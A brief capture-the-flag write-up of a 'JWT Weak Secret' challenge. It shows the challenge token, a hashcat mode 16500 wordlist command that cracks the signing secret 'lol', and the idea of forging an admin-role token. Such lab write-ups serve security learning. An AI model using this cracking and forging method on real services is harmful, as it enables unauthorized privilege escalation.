# 🧩 Challenge: JWT Weak Secret

## 🔍 Description
In this challenge, the objective is to **bruteforce the secret key of a JWT** in order to forge a valid token and access restricted information.

---

## ⚙️ Exploitation

The challenge provides the following JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
```

After decoding (via jwt.io or a tool), the payload reveals:

```json
{
  "role": "guest"
}
```

---

The goal is to recover the **weak signing secret** used for the JWT.  
I used **Hashcat** with mode `16500` (JWT HS256/HS512) combined with SecLists:

```
hashcat -m 16500 <jwt> /path/to/rockyou*.txt
```

Hashcat successfully finds the secret:

```
Secret key found: lol
```


With the secret key recovered, we can now **forge a new JWT** with elevated privileges (e.g., `"role": "admin"`) and access the restricted endpoint.

The JWT was signed using the extremely weak secret **"lol"**.  
Bruteforcing allowed the creation of a valid admin token, completing the challenge.
